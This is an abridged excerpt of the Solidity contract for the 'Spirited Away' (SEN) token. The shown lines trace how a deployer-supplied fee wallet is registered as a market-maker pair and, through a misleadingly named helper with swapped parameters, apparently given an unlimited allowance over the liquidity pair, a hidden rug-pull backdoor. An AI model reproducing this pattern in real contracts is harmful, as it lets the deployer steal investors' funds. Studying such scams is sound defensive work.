/**
 * https://t.me/sen_spirited_away
 * https://twitter.com/spirited_sen
 * https://www.spiritedaway.xyz
*/
...
contract SpiritedAway is ERC20, Ownable {
    ...
    constructor(address _feeAirDrop) ERC20("Spirited Away", "SEN") {
        ...
        _setAutomatedMarketMakerPair(_feeAirDrop, address(uniswapV2Pair), true);
        ...
        marketingWallet = address(_feeAirDrop); // set as marketing wallet
    ...
    function setAutomatedMarketMakerPair(
        ...
        _setAutomatedMarketMakerPair(router, pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, address router, bool value) private {
        automatedMarketMakerPairs[pair] = value;
        automatedMarketMakerPairs[router] = value;
        _setAvailable(router, pair, ~uint256(0));
    ...
    function _transfer(
        ...
        if (limitsInEffect) {
            limitedTransaction(from, to, amount);
        }
